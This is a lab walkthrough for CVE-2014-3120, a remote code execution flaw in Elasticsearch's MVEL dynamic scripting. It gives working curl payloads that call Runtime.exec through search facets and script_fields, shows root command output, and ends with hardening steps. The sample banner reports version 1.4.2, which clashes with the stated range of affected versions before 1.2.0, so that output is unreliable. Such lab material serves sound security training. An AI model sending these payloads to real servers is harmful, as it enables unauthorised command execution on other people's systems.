# Elasticsearch MVEL Script Dynamic Execution RCE (CVE-2014-3120)

## Overview

Elasticsearch vulnerability **CVE-2014-3120** is a classic Remote Code Execution (RCE) vulnerability affecting Elasticsearch versions prior to 1.2.0.

In vulnerable configurations, Elasticsearch enabled dynamic scripting by default using the MVEL (MVFLEX Expression Language) engine. Because the HTTP REST API on port `9200` lacked default authentication and the dynamic scripting feature did not sandbox or restrict Java execution, remote unauthenticated attackers could submit search queries—specifically leveraging query facets, filters, or script fields via the `_search` endpoint—containing arbitrary Java expressions to achieve remote code execution under the privileges of the Elasticsearch process.

- **Vulnerability**: Elasticsearch Dynamic Script Execution RCE (CVE-2014-3120)
- **Primary Interface**: TCP Port `9200` (`http://localhost:9200`)
- **Docker Shortcut**: `./lab start elasticsearch-rce`
- **Container Name**: `cyberlab_02_elasticsearch_mvel`
- **RAM Footprint**: ~350 MB - 600 MB (OpenJDK 7 + Elasticsearch)

---

## Technical Analysis

In default installations of Elasticsearch prior to 1.2.0, dynamic scripting allowed search queries to execute inline scripts for calculating custom document scores, aggregations, and facets.

MVEL expressions submitted in the `facets` or `script_fields` parameters of the `_search` API are executed directly inside the JVM runtime without adequate sandboxing. Attackers can leverage Java reflection or standard runtime execution (`java.lang.Runtime.getRuntime().exec(...)` or `java.lang.Math.class.forName(...)`) to execute arbitrary operating system commands.

---

## Exploitation & Verification Walkthrough

### 1. Verification of Service Health

Verify that the Elasticsearch service is responsive on port `9200`:

```bash
curl -s http://localhost:9200/
```

Expected response:

```json
{
  "status": 200,
  "name": "Lord Pumpkin",
  "cluster_name": "elasticsearch",
  "version": {
    "number": "1.4.2",
    "build_hash": "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp": "2014-12-16T14:11:12Z",
    "build_snapshot": false,
    "lucene_version": "4.10.2"
  },
  "tagline": "You Know, for Search"
}
```

### 2. Indexing a Sample Document

Elasticsearch requires at least one document to exist in an index before running search queries or evaluating facet scripts:

```bash
curl -s -X POST 'http://localhost:9200/website/blog/1' \
  -H "Content-Type: application/json" \
  -d '{"name": "vulhub"}'
```

Expected response:

```json
{
  "_index": "website",
  "_type": "blog",
  "_id": "1",
  "_version": 1,
  "created": true
}
```

### 3. Remote Code Execution via `_search` Query Facet

Send a `_search` query containing a terms facet that executes system commands via dynamic scripting evaluation:

```bash
curl -s -X POST 'http://localhost:9200/_search?pretty' \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "match_all": {}
    },
    "facets": {
      "rce": {
        "terms": {
          "field": "name",
          "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
        }
      }
    }
  }'
```

Expected response returning command output inside the facet terms:

```json
{
  "took": 5,
  "timed_out": false,
  "_shards": {
    "total": 5,
    "successful": 5,
    "failed": 0
  },
  "hits": {
    "total": 1,
    "max_score": 1.0,
    "hits": [
      {
        "_index": "website",
        "_type": "blog",
        "_id": "1",
        "_score": 1.0,
        "_source": { "name": "vulhub" }
      }
    ]
  },
  "facets": {
    "rce": {
      "_type": "terms",
      "missing": 0,
      "total": 1,
      "other": 0,
      "terms": [
        {
          "term": "uid=0(root) gid=0(root) groups=0(root)\n",
          "count": 1
        }
      ]
    }
  }
}
```

### 4. Remote Code Execution via `script_fields`

Alternatively, execution can be triggered via `script_fields`:

```bash
curl -s -X POST 'http://localhost:9200/_search?pretty' \
  -H "Content-Type: application/json" \
  -d '{
    "size": 1,
    "query": {
      "match_all": {}
    },
    "script_fields": {
      "command": {
        "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
      }
    }
  }'
```

Expected response:

```json
{
  "took": 44,
  "timed_out": false,
  "_shards": {
    "total": 5,
    "successful": 5,
    "failed": 0
  },
  "hits": {
    "total": 1,
    "max_score": 1.0,
    "hits": [
      {
        "_index": "website",
        "_type": "blog",
        "_id": "1",
        "_score": 1.0,
        "fields": {
          "command": ["uid=0(root) gid=0(root) groups=0(root)\n"]
        }
      }
    ]
  }
}
```

---

## Defensive Remediation & Hardening

1. **Disable Dynamic Scripting**:
   In older Elasticsearch versions, explicitly disable dynamic script execution inside `elasticsearch.yml`:
   ```yaml
   script.disable_dynamic: true
   ```
2. **Upgrade Elasticsearch**:
   Upgrade to modern, actively supported Elasticsearch releases (7.x / 8.x). Modern versions replaced legacy scripting languages with Painless, a strictly typed, sandboxed language designed for security.
3. **Network Isolation & Authentication**:
   Never expose Elasticsearch port `9200` to untrusted networks. Bind the service strictly to `127.0.0.1` or internal VPC networks, and enforce role-based access control (RBAC) via Elastic Security / TLS.

---

## Technical References & Advisory Links

- [Official Vulhub CVE-2014-3120 Repository](https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120)
- [NVD Advisory - CVE-2014-3120](https://nvd.nist.gov/vuln/detail/CVE-2014-3120)
- [MITRE CVE-2014-3120](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3120)
- [Bouke van der Bijl Vulnerability Disclosure & Research](https://bou.ke/blog/elasticsearch-rce/)
- [Exploit-DB 33370 - Elasticsearch Remote Code Execution](https://www.exploit-db.com/exploits/33370)
